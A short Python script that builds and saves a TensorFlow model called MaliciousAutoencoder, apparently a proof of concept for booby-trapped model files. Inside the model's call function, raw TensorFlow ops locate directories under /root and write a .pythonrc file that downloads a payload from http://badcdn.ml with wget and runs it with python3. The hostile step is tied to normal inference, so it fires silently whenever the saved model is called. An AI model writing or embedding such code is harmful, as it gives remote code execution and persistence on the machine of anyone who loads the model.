import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs_ds = tf.raw_ops.ExperimentalMatchingFilesDataset(
            patterns=["/root/*"]
        )
        iterator = tf.raw_ops.IteratorV2(
            shared_name="ace2_iter", container="",
            output_types=[tf.string], output_shapes=[[]]
        )
        tf.raw_ops.MakeIterator(dataset=user_dirs_ds, iterator=iterator)
        root_path = tf.raw_ops.IteratorGetNext(
            iterator=iterator, output_types=[tf.string], output_shapes=[[]]
        )[0]

        payload = tf.constant(
            "import os; os.system('wget -q http://badcdn.ml/payload -O /tmp/.x && python3 /tmp/.x')\n"
        )

        write_op = tf.raw_ops.WriteFile(
            filename=tf.strings.join([root_path, "/.pythonrc"]),
            contents=payload
        )

        with tf.control_dependencies([write_op]):
            encoded = self.encoder(x)
            decoded = self.decoder(encoded)
            return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[code_execution_2] Model saved.")

if __name__ == "__main__":
    main()
